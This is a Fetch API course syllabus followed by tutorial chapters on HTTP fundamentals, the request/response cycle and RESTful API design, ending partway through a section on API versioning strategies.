# Syllabus

## Module 1: Foundations

- HTTP protocol fundamentals
- Request/response cycle
- URLs and URIs
- RESTful API concepts
- Browser networking basics
- Same-origin policy
- Evolution from XMLHttpRequest to Fetch

## Module 2: Basic Fetch Syntax

- fetch() function signature
- Promise-based architecture
- Basic GET requests
- Response object structure
- Text response handling
- JSON response handling
- Response status codes

## Module 3: Request Configuration

- Request initialization options
- HTTP methods (GET, POST, PUT, DELETE, PATCH)
- Custom headers
- Request body formats
- URL construction and parameters
- Query string handling
- Request object creation

## Module 4: Request Headers

- Standard HTTP headers
- Custom headers
- Content-Type header
- Accept header
- Authorization header
- User-Agent and other metadata headers
- Header manipulation methods
- Headers object API

## Module 5: Request Body

- FormData API
- JSON payloads
- URLSearchParams
- Blob and File objects
- ArrayBuffer and typed arrays
- Text/plain bodies
- Multipart form data
- Body serialization

## Module 6: Response Handling

- Response object properties
- Response.ok property
- Response.status and statusText
- Response.headers
- Response.type
- Response.url
- Response.redirected
- Response cloning

## Module 7: Response Body Methods

- response.json()
- response.text()
- response.blob()
- response.arrayBuffer()
- response.formData()
- Body stream handling
- Multiple body reads
- Body used flag

## Module 8: Error Handling

- Network errors vs HTTP errors
- Try-catch patterns
- Promise rejection handling
- Status code validation
- Timeout handling
- Retry strategies
- Error recovery patterns
- Custom error classes

## Module 9: CORS (Cross-Origin Resource Sharing)

- CORS concepts and mechanics
- Preflight requests
- Simple vs complex requests
- CORS headers (server-side)
- Credentials and cookies
- Mode options (cors, no-cors, same-origin)
- CORS error debugging
- Proxy patterns for development

## Module 10: Authentication

- Basic authentication
- Bearer tokens
- API keys
- OAuth 2.0 flows
- JWT handling
- Refresh token patterns
- Session management
- Secure credential storage

## Module 11: Request Options

- mode (cors, no-cors, same-origin, navigate)
- credentials (omit, same-origin, include)
- cache control options
- redirect handling
- referrer and referrerPolicy
- integrity checks
- keepalive option
- signal (AbortSignal)

## Module 12: Abort and Cancellation

- AbortController API
- AbortSignal usage
- Cancelling in-flight requests
- Timeout implementation
- Multiple request cancellation
- Cleanup patterns
- Race conditions handling

## Module 13: Streaming

- ReadableStream API
- Response body streaming
- Chunked transfer encoding
- Progress tracking
- Stream processing
- Backpressure handling
- Transform streams
- Server-Sent Events integration

## Module 14: File Operations

- File upload
- File download
- Progress monitoring
- Large file handling
- Blob URL creation
- Multiple file uploads
- Drag-and-drop integration
- File validation

## Module 15: Caching Strategies

- Cache API integration
- Cache-Control headers
- ETags and validation
- Conditional requests
- Service Worker caching
- Cache-first strategies
- Network-first strategies
- Stale-while-revalidate

## Module 16: Request Interceptors

- Global fetch wrapping
- Middleware patterns
- Request transformation
- Response transformation
- Logging and monitoring
- Authentication injection
- Retry logic implementation

## Module 17: Advanced Patterns

- Request pooling
- Rate limiting
- Request deduplication
- Parallel requests with Promise.all()
- Sequential requests
- Request chaining
- Conditional requests
- Polling patterns

## Module 18: Performance Optimization

- Request batching
- Payload compression
- Connection reuse
- DNS prefetching
- Resource hints (preconnect, prefetch)
- Lazy loading
- Debouncing and throttling
- Request prioritization

## Module 19: Security

- XSS prevention
- CSRF protection
- Content Security Policy
- Subresource Integrity
- Secure headers
- Input validation
- Output encoding
- Sensitive data handling

## Module 20: Testing

- Mocking fetch requests
- Jest and testing libraries
- Mock Service Worker (MSW)
- Fixture data management
- Integration testing
- Error scenario testing
- Network condition simulation
- Test coverage strategies

## Module 21: Browser Compatibility

- Feature detection
- Polyfills
- Fallback strategies
- Progressive enhancement
- Browser-specific issues
- Mobile browser considerations
- Legacy browser support

## Module 22: Debugging

- Network tab analysis
- Chrome DevTools features
- Firefox developer tools
- Request/response inspection
- Performance profiling
- HAR file analysis
- Proxy tools (Charles, Fiddler)
- Console logging strategies

## Module 23: State Management Integration

- Redux integration
- React Query patterns
- SWR (stale-while-revalidate)
- Apollo Client comparison
- Context API usage
- Local state synchronization
- Optimistic updates

## Module 24: Framework Integration

- React hooks patterns
- Vue.js composition API
- Angular HttpClient comparison
- Svelte stores integration
- Next.js data fetching
- Server-side rendering considerations
- Static generation patterns

## Module 25: Real-World Patterns

- Pagination
- Infinite scroll
- Search and filtering
- Sorting
- Real-time updates
- WebSocket fallback
- Long polling
- Data synchronization

## Module 26: API Design Considerations

- REST API best practices
- GraphQL integration
- Versioning strategies
- Pagination standards
- Rate limiting responses
- Error response formats
- API documentation consumption
- OpenAPI/Swagger integration

## Module 27: Monitoring and Analytics

- Request timing
- Success/failure tracking
- Performance metrics
- Error reporting
- User analytics
- APM integration
- Custom metrics
- Logging strategies

## Module 28: Advanced Security

- Token refresh flows
- Secure token storage
- Certificate pinning
- Request signing
- Encryption in transit
- Man-in-the-middle prevention
- Security headers validation
- Compliance requirements

## Module 29: Progressive Web Apps

- Background sync
- Service Worker fetch events
- Offline-first strategies
- Cache management
- Push notification integration
- App shell pattern
- Dynamic content caching

## Module 30: Modern Alternatives

- Axios comparison
- ky library
- wretch library
- fetch wrapper libraries
- Native alternatives (fetch extensions)
- GraphQL clients
- When to use alternatives
- Migration strategies

## Module 31: TypeScript Integration

- Type definitions
- Generic response types
- Request type safety
- Custom type guards
- Interface design
- Discriminated unions for responses
- Utility types for fetch
- Error type narrowing

## Module 32: Production Best Practices

- Environment configuration
- Base URL management
- Timeout configuration
- Retry policies
- Circuit breaker pattern
- Request queuing
- Resource cleanup
- Memory leak prevention

## Module 33: Accessibility

- Loading states
- Error messaging
- Screen reader support
- Keyboard navigation during loading
- Progress indication
- User feedback patterns
- Timeout notifications

## Module 34: Standards and Specifications

- WHATWG Fetch Standard
- HTTP/2 and HTTP/3 implications
- Spec compliance
- Proposal tracking
- Future features
- Browser implementation differences
- Standards evolution

---

# Foundations

## HTTP Protocol Fundamentals

### Request-Response Cycle

HTTP operates as a stateless, application-layer protocol where clients initiate requests and servers return responses. Each transaction is independent—the protocol itself retains no memory of previous exchanges. A complete cycle involves the client opening a TCP connection, sending an HTTP request, receiving the server's response, and typically closing the connection (though persistent connections modify this pattern).

### Request Structure

An HTTP request consists of three components: the request line, headers, and an optional body.

The request line contains the method (GET, POST, PUT, DELETE, etc.), the request target (typically a URI path), and the HTTP version. For example: `GET /api/users/123 HTTP/1.1`.

Headers provide metadata about the request. Common headers include `Host` (required in HTTP/1.1), `User-Agent`, `Accept` (content types the client can process), `Content-Type` (format of the request body), `Authorization` (credentials), and `Cookie` (session data). Headers follow a key-value format separated by colons.

The request body carries data for methods like POST, PUT, or PATCH. The body's format depends on the `Content-Type` header—common types include `application/json`, `application/x-www-form-urlencoded`, and `multipart/form-data`.

### Response Structure

HTTP responses mirror the request structure with a status line, headers, and optional body.

The status line includes the HTTP version, a three-digit status code, and a reason phrase. Example: `HTTP/1.1 200 OK`.

Status codes are grouped into five classes:

- **1xx (Informational)**: Interim responses, like `100 Continue`
- **2xx (Success)**: Request succeeded, such as `200 OK`, `201 Created`, `204 No Content`
- **3xx (Redirection)**: Further action needed, including `301 Moved Permanently`, `302 Found`, `304 Not Modified`
- **4xx (Client Error)**: Client-side problems, like `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `429 Too Many Requests`
- **5xx (Server Error)**: Server failures, such as `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`

Response headers convey metadata about the response. Key headers include `Content-Type`, `Content-Length`, `Cache-Control`, `Set-Cookie` (instructs client to store cookies), `Location` (redirect target), and `ETag` (resource version identifier).

### HTTP Methods

**GET** retrieves resources without side effects. It's idempotent—multiple identical requests produce the same result. GET requests should not include a body, though some servers may accept it.

**POST** submits data to create new resources or trigger processing. It's neither safe nor idempotent—repeated requests may create multiple resources.

**PUT** replaces a resource entirely or creates it at a specific URI. It's idempotent but not safe—sending the same PUT multiple times leaves the resource in the same state.

**PATCH** applies partial modifications. Unlike PUT, it doesn't require sending the complete resource representation.

**DELETE** removes resources. It's idempotent—deleting an already-deleted resource typically returns `404` or `204`.

**HEAD** behaves like GET but returns only headers, no body. Useful for checking resource metadata or existence without transferring content.

**OPTIONS** describes communication options for the target resource. Servers return allowed methods via the `Allow` header. CORS preflight requests use OPTIONS.

**CONNECT** establishes a tunnel, typically for SSL/TLS connections through proxies.

**TRACE** performs a message loop-back test along the path to the target resource. Often disabled for security reasons.

### Headers in Detail

**Request Headers:**

- `Accept-*` headers (`Accept`, `Accept-Language`, `Accept-Encoding`) inform the server of client capabilities
- `If-*` conditional headers (`If-Modified-Since`, `If-None-Match`) enable conditional requests
- `Range` requests partial content
- `Referer` indicates the previous page
- `Origin` identifies the request's origin for CORS

**Response Headers:**

- `Access-Control-*` headers manage CORS policies
- `Cache-Control` and `Expires` govern caching behavior
- `Content-Encoding` specifies compression (gzip, deflate, br)
- `Transfer-Encoding: chunked` indicates streaming responses
- `WWW-Authenticate` specifies authentication schemes after `401`

**General Headers:**

- `Connection` controls connection persistence (`keep-alive`, `close`)
- `Date` provides the message origination timestamp
- `Via` tracks proxies in the request/response chain

### Persistent Connections

HTTP/1.0 closed connections after each request. HTTP/1.1 introduced persistent connections (`Connection: keep-alive` is default), allowing multiple requests over a single TCP connection. This reduces latency from TCP handshakes and slow-start.

The `Keep-Alive` header can specify timeout and maximum requests: `Keep-Alive: timeout=5, max=100`.

### Content Negotiation

Servers select response representations based on client preferences expressed through `Accept` headers:

**Proactive negotiation**: Server chooses based on request headers **Reactive negotiation**: Server returns `300 Multiple Choices` or `406 Not Acceptable`, letting the client decide **Transparent negotiation**: Intermediary caches perform negotiation

The `Vary` header indicates which request headers affect the response representation, guiding cache behavior.

### Caching Mechanisms

HTTP caching reduces server load and improves response times. Cache behavior is controlled through several mechanisms:

**`Cache-Control` directives:**

- `public`: Any cache may store
- `private`: Only client caches, not shared proxies
- `no-cache`: Must revalidate with server before use
- `no-store`: Do not cache at all
- `max-age=<seconds>`: Resource freshness lifetime
- `must-revalidate`: Stale caches must validate before use
- `immutable`: Resource never changes during freshness period

**Validation:**

- `ETag` provides a resource version identifier; clients send `If-None-Match` to validate
- `Last-Modified` timestamp enables `If-Modified-Since` conditional requests
- Successful validation returns `304 Not Modified` with no body

**Heuristic caching**: When no explicit freshness information exists, caches may use heuristics (often 10% of the `Last-Modified` age).

### Cookies and State Management

Since HTTP is stateless, cookies provide session continuity. The server sends `Set-Cookie` headers, and clients return `Cookie` headers in subsequent requests.

**`Set-Cookie` attributes:**

- `Domain`: Scope of the cookie
- `Path`: URL path restriction
- `Expires` / `Max-Age`: Lifetime control
- `Secure`: HTTPS-only transmission
- `HttpOnly`: Prevents JavaScript access, mitigating XSS
- `SameSite`: Controls cross-site sending (`Strict`, `Lax`, `None`)

### Authentication

HTTP supports several authentication schemes communicated via `WWW-Authenticate` and `Authorization` headers:

**Basic Authentication**: Encodes credentials as Base64 (not encryption). Format: `Authorization: Basic <base64(username:password)>`. Should only be used over HTTPS.

**Digest Authentication**: Uses challenge-response with MD5 hashing, avoiding plaintext transmission.

**Bearer Token**: Common in OAuth 2.0. Format: `Authorization: Bearer <token>`.

### Content Encoding and Transfer Encoding

**Content-Encoding** compresses the body before transmission. Common values: `gzip`, `deflate`, `br` (Brotli). The client indicates support via `Accept-Encoding`, and the server responds with `Content-Encoding`.

**Transfer-Encoding** transforms the message itself. `Transfer-Encoding: chunked` sends data in chunks without knowing total size upfront. Each chunk includes its size in hexadecimal, followed by data, ending with a zero-size chunk.

### Range Requests

Clients request partial content using the `Range` header: `Range: bytes=0-1023`. Useful for resuming downloads or streaming.

The server responds with `206 Partial Content` and includes `Content-Range` specifying the delivered range: `Content-Range: bytes 0-1023/5000`.

If the server doesn't support ranges, it returns `200 OK` with the full resource. The `Accept-Ranges: bytes` header indicates range support.

### Redirects

Redirection status codes (3xx) instruct clients to fetch the resource from a different location, specified in the `Location` header.

**301 Moved Permanently**: Search engines update their indexes. Browsers may change POST to GET.

**302 Found**: Temporary redirect. Original URI should be used for future requests. Browsers may change POST to GET.

**303 See Other**: Explicitly instructs the client to use GET for the redirect, regardless of the original method.

**307 Temporary Redirect**: Guarantees the method and body are preserved in the redirected request.

**308 Permanent Redirect**: Like 301 but guarantees method preservation.

### CORS (Cross-Origin Resource Sharing)

CORS enables controlled cross-origin requests through headers:

**Simple requests** (GET, HEAD, POST with limited content types) include an `Origin` header. The server responds with `Access-Control-Allow-Origin` specifying allowed origins (`*` for any, or specific origins).

**Preflight requests** use OPTIONS for non-simple requests (custom headers, methods like PUT/DELETE, non-simple content types). The browser sends:

- `Access-Control-Request-Method`
- `Access-Control-Request-Headers`

The server responds with:

- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`
- `Access-Control-Max-Age` (cache duration for preflight results)

**Credentials**: `Access-Control-Allow-Credentials: true` permits cookies/auth. When true, `Access-Control-Allow-Origin` cannot be `*`.

### Connection Management

**HTTP/1.0**: One request per connection (unless `Connection: keep-alive` is negotiated).

**HTTP/1.1**: Persistent connections by default. Pipelining allows sending multiple requests without waiting for responses, though head-of-line blocking limits its effectiveness.

**Connection pooling**: Clients maintain multiple persistent connections to the same server to parallelize requests.

The `Connection: close` header signals that the connection will close after the response completes.

### HTTP Semantics

**Idempotency**: Methods (GET, PUT, DELETE, HEAD, OPTIONS, TRACE) that produce the same result regardless of repetition. POST and PATCH are not idempotent.

**Safety**: Methods (GET, HEAD, OPTIONS, TRACE) that don't modify server state. Safe methods are also idempotent.

**Cachability**: GET, HEAD, and POST responses may be cached (though POST caching is rare in practice). PUT, DELETE, PATCH typically aren't cached.

### Message Body Handling

The message body presence and length are determined by:

1. Responses to HEAD requests never include a body
2. `204 No Content` and `304 Not Modified` responses have no body
3. `Content-Length` header specifies the exact body size
4. `Transfer-Encoding: chunked` indicates variable-size body transmitted in chunks
5. Connection closure signals body end (HTTP/1.0 style, not reliable)

When both `Content-Length` and `Transfer-Encoding` are present, `Transfer-Encoding` takes precedence.

### URL Encoding

Special characters in URLs must be percent-encoded. Reserved characters (`?`, `&`, `=`, `/`, `#`, etc.) have special meaning. Unreserved characters (alphanumeric, `-`, `_`, `.`, `~`) don't require encoding.

Format: `%` followed by two hexadecimal digits representing the byte value. Space becomes `%20` (or `+` in query strings with `application/x-www-form-urlencoded`).

### Error Handling

Clients should handle various error scenarios:

**Network failures**: Connection timeouts, DNS resolution failures, unreachable hosts.

**HTTP errors**: Status codes indicate different failure types. 4xx errors suggest client-side issues (fix the request); 5xx errors indicate server problems (retry may help).

**Retries**: Idempotent methods (GET, PUT, DELETE) can be safely retried. Non-idempotent methods (POST) require careful consideration—duplicates may cause issues.

**Exponential backoff**: When retrying, progressively increase delay between attempts to avoid overwhelming servers.

---

## Request/Response Cycle

### Core Mechanics

The request/response cycle represents the fundamental communication pattern between clients and servers in networked applications. When a client initiates a request, it travels through multiple layers of the network stack, gets processed by the server, and returns with a response following the same path in reverse.

Each cycle begins when the client formulates a request containing the method, target resource, headers, and optional body. The request traverses the transport layer where TCP establishes reliability through three-way handshake, sequence numbers, and acknowledgments. The server's listening socket accepts the connection, spawns a handler (thread, process, or async task depending on the architecture), and begins parsing the incoming data stream.

### HTTP Request Structure

The request line contains three components: the HTTP method (GET, POST, PUT, DELETE, PATCH, etc.), the request target (URI), and the HTTP version. The request target can take multiple forms—absolute paths being most common in typical client-server interactions, while proxy requests often use absolute URIs.

Headers follow the request line, providing metadata about the request itself and the client's capabilities. Essential headers include Host (mandatory in HTTP/1.1), User-Agent, Accept types, Content-Type for requests with bodies, Content-Length or Transfer-Encoding, Authorization credentials, Cookie data, and connection management directives like Connection: keep-alive or Connection: close.

The request body contains the payload for methods like POST and PUT. Bodies can be transmitted using different encoding schemes: application/x-www-form-urlencoded for form submissions, multipart/form-data for file uploads, application/json for API interactions, or application/octet-stream for binary data.

### Server Processing Pipeline

Upon receiving the request, the server performs multiple sequential operations. Request parsing validates the syntax, extracts components, and constructs internal representations. Routing logic matches the request path and method against defined handlers using exact matches, pattern matching with wildcards or regex, or RESTful resource mapping.

Middleware chains execute in order, each performing specific tasks: authentication verification, authorization checks, request logging, body parsing, compression handling, CORS policy enforcement, rate limiting, and request validation. Each middleware can short-circuit the pipeline by sending an early response or modify the request before passing it downstream.

The application handler receives the processed request and executes business logic: database queries, external API calls, file system operations, computation, caching lookups, and data transformation. Error handling wraps this execution to catch exceptions and convert them into appropriate error responses.

### Response Construction

The server constructs the response starting with a status line containing the HTTP version, status code, and reason phrase. Status codes fall into five categories: 1xx informational (rarely used outside websocket upgrades), 2xx success (200 OK, 201 Created, 204 No Content), 3xx redirection (301 Moved Permanently, 302 Found, 304 Not Modified), 4xx client errors (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests), and 5xx server errors (500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable).

Response headers communicate metadata about the response: Content-Type specifies the media type, Content-Length indicates body size, Cache-Control and ETag enable caching strategies, Set-Cookie establishes client state, Location provides redirect targets, and Access-Control headers handle CORS permissions.

The response body carries the actual content requested—HTML documents, JSON data, XML, binary files, or streaming data. The Content-Type header's media type instructs the client how to interpret the body bytes.

### Connection Management

HTTP/1.0 defaulted to closing connections after each request/response cycle, requiring new TCP handshakes for subsequent requests. HTTP/1.1 introduced persistent connections (keep-alive), allowing multiple request/response cycles over a single TCP connection, dramatically reducing latency by eliminating repeated handshake overhead.

The server and client negotiate connection persistence through Connection headers. Keep-alive connections remain open for a timeout period (typically 5-120 seconds) or until reaching a maximum request count. Servers must carefully manage connection pools to prevent resource exhaustion while maximizing reuse.

HTTP/2 multiplexes multiple request/response pairs over a single connection using binary framing and stream IDs, eliminating head-of-line blocking at the HTTP layer. Each stream operates independently with its own flow control, priority, and state machine.

### State Management

HTTP itself is stateless—each request contains all information needed for processing without relying on server-stored context from previous requests. Applications build statefulness on top using several mechanisms:

Cookies store small text data on the client, sent with every request to the same domain. Session cookies exist only during the browser session, while persistent cookies have explicit expiration dates. Servers set cookies via Set-Cookie headers with attributes controlling scope (Domain, Path), security (Secure, HttpOnly, SameSite), and lifetime (Max-Age, Expires).

Session management typically uses session IDs stored in cookies, with actual session data maintained server-side in memory, databases, or distributed caches like Redis. This approach keeps sensitive data on the server while minimizing cookie size.

Token-based authentication (JWT, OAuth tokens) embeds claims and signatures within the token itself, enabling stateless verification without server-side session storage. Tokens travel in Authorization headers or cookies, with servers validating signatures cryptographically.

### Caching Layers

Multiple caching layers exist between client and origin server. Browser caches store responses locally based on Cache-Control directives, Expires headers, and heuristic freshness. Validators like ETag and Last-Modified enable conditional requests (If-None-Match, If-Modified-Since) that return 304 Not Modified when content hasn't changed.

CDN and proxy caches sit between clients and origin servers, serving cached responses to multiple clients. The Vary header specifies which request headers affect cache key calculation. Cache-Control directives control cacheability: public allows shared caches, private restricts to browser caches, no-cache requires revalidation, no-store prevents all caching, max-age sets freshness lifetime, and s-maxage specifies shared cache lifetime separately.

### Asynchronous Patterns

Long-polling keeps requests open until the server has data to send, then completes the response and has the client immediately open a new request. This simulates server push while working within the request/response model's constraints.

Server-Sent Events (SSE) establish a persistent connection where the server streams events to the client using a specific text format. The client receives events as they occur without polling, though communication remains unidirectional from server to client.

WebSockets upgrade HTTP connections to bidirectional, full-duplex communication channels through a handshake using HTTP Upgrade headers. Once upgraded, the connection no longer follows request/response semantics, enabling true push notifications and real-time bidirectional data flow.

### Error Handling and Resilience

Clients must handle various failure scenarios: network timeouts, connection errors, DNS failures, and server errors. Retry logic with exponential backoff prevents overwhelming struggling servers. Circuit breakers detect repeated failures and temporarily stop sending requests to failing endpoints.

Timeout configuration requires balancing responsiveness against allowing time for legitimate slow operations. Connection timeouts limit time to establish TCP connections, read timeouts limit time between receiving response bytes, and overall request timeouts cap total cycle duration.

Graceful degradation provides partial functionality when dependencies fail. Fallback responses, cached data, or simplified features maintain usability despite failures in non-critical components.

### Performance Optimization

Request/response cycle performance depends on multiple factors. Network latency—the round-trip time between client and server—represents an irreducible minimum. TCP slow start gradually increases transmission rate, penalizing short-lived connections that never reach full throughput.

Connection pooling and reuse amortize handshake costs across multiple requests. HTTP pipelining (HTTP/1.1) allows sending multiple requests without waiting for responses, though head-of-line blocking limits effectiveness. HTTP/2's multiplexing eliminates this blocking through independent streams.

Compression (gzip, brotli) reduces payload size at the cost of CPU cycles. The trade-off favors compression for text-based content over slow networks but may not benefit binary data or fast local networks.

Request/response batching combines multiple logical operations into single HTTP requests, reducing round trips. GraphQL exemplifies this pattern, allowing clients to request multiple resources in one query.

### Security Considerations

The request/response cycle presents multiple security concerns. HTTPS encrypts communication using TLS, preventing eavesdropping and tampering. Certificate validation ensures the server's identity, while proper cipher suite selection balances security and performance.

CSRF attacks exploit the browser's automatic cookie transmission by tricking users into making authenticated requests to other sites. Defenses include synchronizer tokens (random values in forms that must match session state), SameSite cookie attributes restricting cross-site cookie transmission, and custom headers that CSRF attacks cannot set.

Injection attacks occur when user input flows unsanitized into executed code—SQL injection, command injection, or header injection. Input validation, parameterized queries, and proper escaping prevent these attacks.

Rate limiting protects against abuse and resource exhaustion by restricting request frequency per client, typically using token bucket or sliding window algorithms. Implementation occurs at various layers: application logic, reverse proxies, API gateways, or infrastructure providers.

### Monitoring and Observability

Production systems require visibility into request/response cycles. Structured logging captures request metadata: timestamp, client IP, method, path, status code, response time, user agent, and error details. Log aggregation systems enable searching and analysis across distributed services.

Metrics track quantitative performance: request rate, error rate, latency percentiles (p50, p95, p99), and throughput. Time series databases store metrics for graphing and alerting.

Distributed tracing follows requests across multiple services by propagating trace context in headers (trace ID, span ID, parent span ID). Each service creates spans representing local work, ultimately reconstructing the complete request flow with timing breakdown.

---

## [[URL-URI]]

---

## RESTful API Concepts

### Architectural Constraints

REST (Representational State Transfer) defines six architectural constraints that distinguish it from other API paradigms.

**Client-Server Separation** The client and server operate independently, communicating only through requests and responses. The server manages data storage and business logic while clients handle the user interface and presentation layer. This separation allows each component to evolve independently—frontend teams can rebuild interfaces without touching backend code, and vice versa.

**Statelessness** Each request from client to server must contain all information necessary to understand and process the request. The server stores no client context between requests. Session state resides entirely on the client side. This constraint improves scalability since servers don't need to maintain, update, or communicate session state. Any server in a cluster can handle any request without coordination.

**Cacheability** Responses must explicitly or implicitly define themselves as cacheable or non-cacheable. When cacheable, clients can reuse response data for subsequent equivalent requests. This reduces client-server interactions and improves performance. Cache-Control, ETag, and Expires headers control caching behavior.

**Uniform Interface** REST mandates a standardized way of communicating between client and server through four interface constraints:

- Resource identification in requests (URIs identify resources)
- Resource manipulation through representations (JSON/XML representations contain enough information to modify resources)
- Self-descriptive messages (each message includes enough information to describe how to process it)
- Hypermedia as the engine of application state (HATEOAS—clients transition through application states via hyperlinks provided dynamically by server)

**Layered System** Client cannot ordinarily tell whether it's connected directly to the end server or an intermediary. Intermediary servers can improve scalability through load balancing and provide shared caching. Layers enforce security policies. This constraint allows architectural flexibility without impacting clients.

**Code-On-Demand (Optional)** Servers can temporarily extend client functionality by transferring executable code (JavaScript, applets). This is the only optional constraint.

### Resource-Oriented Design

**Resource Identification** Resources are the fundamental concept in REST. A resource is any information that can be named—documents, images, temporal services, collections of other resources, or non-virtual objects. Each resource has a unique URI (Uniform Resource Identifier).

Resource URIs follow hierarchical patterns reflecting resource relationships:

- `/users` - collection of users
- `/users/123` - specific user
- `/users/123/orders` - orders belonging to user 123
- `/users/123/orders/456` - specific order

**Resource vs Representation** The resource itself is an abstract entity. The representation is the current state of that resource in a particular format (JSON, XML, HTML). A single resource can have multiple representations. The client requests specific representations through content negotiation.

**URI Design Principles** URIs should use nouns, not verbs, since HTTP methods provide the verbs. Plural nouns for collections maintain consistency. Forward slashes indicate hierarchical relationships. Hyphens improve readability over underscores. Lowercase letters prevent case-sensitivity issues. File extensions are unnecessary when using Accept headers.

Avoid: `/getUser`, `/user/delete`, `/users/123/deleteOrder/456` Prefer: `/users/123`, `/users/123/orders/456` with appropriate HTTP methods

### HTTP Methods Semantics

**GET** Retrieves resource representations without side effects. GET is safe (doesn't alter server state) and idempotent (multiple identical requests produce the same result). Responses are cacheable by default. Query parameters filter, sort, or paginate collections.

**POST** Creates new resources or submits data for processing. POST requests are neither safe nor idempotent—repeated identical POSTs create multiple resources. The server determines the URI for created resources, returning it in the Location header with a 201 status. POST can also trigger operations that don't fit other methods.

**PUT** Replaces the entire resource at a specific URI. If the resource doesn't exist, PUT may create it. PUT is idempotent—repeating the same PUT request produces identical results. The client specifies the complete resource representation. Partial updates require PATCH.

**PATCH** Applies partial modifications to resources. Unlike PUT, PATCH sends only changed fields. PATCH idempotency depends on implementation. JSON Patch (RFC 6902) and JSON Merge Patch (RFC 7396) provide standardized formats for describing changes.

**DELETE** Removes resources. DELETE is idempotent—deleting the same resource multiple times yields the same result (resource doesn't exist). Subsequent GET requests return 404. Some implementations use soft deletes, marking resources as deleted without removing data.

**HEAD** Identical to GET but returns only headers, no body. Useful for checking resource existence, getting metadata, or validating cached representations without transferring the entire resource.

**OPTIONS** Returns supported HTTP methods for a resource. The Allow header lists available methods. CORS preflight requests use OPTIONS to determine if cross-origin requests are permitted.

### Status Codes and Their Meanings

**1xx Informational** Rarely used in REST APIs. 100 Continue indicates the server received request headers and the client should send the body. 101 Switching Protocols occurs during WebSocket upgrades.

**2xx Success**

- 200 OK: Standard success response for GET, PUT, PATCH, or POST that doesn't create resources
- 201 Created: Resource successfully created, typically POST responses, includes Location header
- 202 Accepted: Request accepted for processing but not completed, used for asynchronous operations
- 204 No Content: Success with no response body, common for DELETE or PUT responses
- 206 Partial Content: Partial GET response, used with Range headers for chunked downloads

**3xx Redirection**

- 301 Moved Permanently: Resource permanently relocated, clients should update bookmarks
- 302 Found: Temporary redirect, original URI should be used for future requests
- 303 See Other: Result of POST available at different URI via GET
- 304 Not Modified: Cached version is current, used with conditional requests (If-None-Match, If-Modified-Since)
- 307 Temporary Redirect: Similar to 302 but preserves request method
- 308 Permanent Redirect: Similar to 301 but preserves request method

**4xx Client Errors**

- 400 Bad Request: Malformed syntax, invalid JSON, or violated validation rules
- 401 Unauthorized: Authentication required or failed (misnomer—should be "Unauthenticated")
- 403 Forbidden: Authenticated but lacks permissions for the resource
- 404 Not Found: Resource doesn't exist at specified URI
- 405 Method Not Allowed: HTTP method not supported for resource, includes Allow header
- 406 Not Acceptable: Cannot produce representation matching Accept headers
- 409 Conflict: Request conflicts with current resource state, common with concurrent modifications
- 410 Gone: Resource permanently removed, unlike 404 which may be temporary
- 412 Precondition Failed: Conditional request headers (If-Match, If-Unmodified-Since) not met
- 413 Payload Too Large: Request body exceeds server limits
- 415 Unsupported Media Type: Content-Type not supported
- 422 Unprocessable Entity: Syntactically correct but semantically invalid
- 429 Too Many Requests: Rate limit exceeded, includes Retry-After header

**5xx Server Errors**

- 500 Internal Server Error: Generic server failure
- 501 Not Implemented: Server doesn't support the functionality
- 502 Bad Gateway: Invalid response from upstream server
- 503 Service Unavailable: Temporary unavailability, maintenance, or overload, includes Retry-After header
- 504 Gateway Timeout: Upstream server didn't respond in time

### Content Negotiation

**Media Type Negotiation** Clients specify acceptable response formats using the Accept header. Servers examine this header and return content in the best matching format, indicating the choice in the Content-Type response header.

```
Accept: application/json, application/xml;q=0.9, */*;q=0.8
```

The `q` parameter (quality factor) ranges from 0 to 1, indicating preference. Higher values signal greater preference. Without `q`, the value defaults to 1.0.

**Content Type Negotiation for Requests** The Content-Type header specifies the request body format. Servers returning 415 indicate they cannot process the provided media type.

**Language Negotiation** Accept-Language header specifies preferred natural languages. Content-Language response header indicates the language used.

**Encoding Negotiation** Accept-Encoding specifies acceptable compression algorithms (gzip, deflate, br). Content-Encoding indicates the applied compression.

**Charset Negotiation** While declining in importance with UTF-8 dominance, Accept-Charset specifies character encoding preferences.

**Proactive vs Reactive Negotiation** Proactive negotiation uses request headers—the server selects the representation. Reactive negotiation returns 300 Multiple Choices with available representations—the client selects. Proactive negotiation is standard in REST APIs.

### Hypermedia and HATEOAS

**HATEOAS Principle** Hypermedia as the Engine of Application State means clients interact with applications entirely through hypermedia provided dynamically by servers. Rather than constructing URIs based on documentation, clients discover available actions through links in responses.

**Link Relations** Links include `rel` (relationship) attributes describing the link's purpose. Standard relations (defined in IANA registry) include:

- `self`: Current resource
- `next`/`prev`: Pagination
- `first`/`last`: Collection boundaries
- `edit`: Resource modification endpoint
- `delete`: Resource deletion endpoint
- `related`: Associated resources

**Hypermedia Formats** Various formats embed hypermedia in responses:

HAL (Hypertext Application Language) uses `_links` and `_embedded` objects:

```json
{
  "id": 123,
  "name": "John Doe",
  "_links": {
    "self": { "href": "/users/123" },
    "orders": { "href": "/users/123/orders" },
    "avatar": { "href": "/users/123/avatar" }
  }
}
```

JSON:API standardizes document structure with relationships and links objects.

Collection+JSON focuses on read-write collections with queries and templates.

Siren represents entities with properties, links, actions, and sub-entities.

**Benefits and Challenges** HATEOAS decouples clients from URI structure. Servers can reorganize without breaking clients. Clients automatically discover new functionality. API becomes self-documenting through exploration.

However, HATEOAS increases payload size. Clients require more complex logic to parse and follow links. Many developers find the added complexity unjustified for simple APIs. Consequently, many "RESTful" APIs ignore HATEOAS while implementing other REST principles.

### Versioning Strategies

**URI Path Versioning** Version number appears in the URI path:

```
/v1/users/123
/v2/users/123
```

This approach is explicit and simple. Versions are easily cached separately. However, it violates the principle that URIs identify resources—the same resource has different URIs across versions. Proliferates endpoints across versions.

**Query Parameter Versioning** Version specified as query parameter:

```
/users/123?version=1
/users/123?version=2
```

Keeps base URI consistent. However, complicates caching since query parameters traditionally represent filters. Less visible than path versioning.

**Header Versioning** Custom header specifies version:

```
X-API-Version: 2
API-Version: 2
```

Keeps URIs clean and resource-focused. Separates versioning from resource identification. However, less visible—harder to test in browsers. Requires custom headers rather than standard HTTP.

**Content Negotiation Versioning** Version embedded in media type:

```
Accept: application/vnd.company.v2+json
```

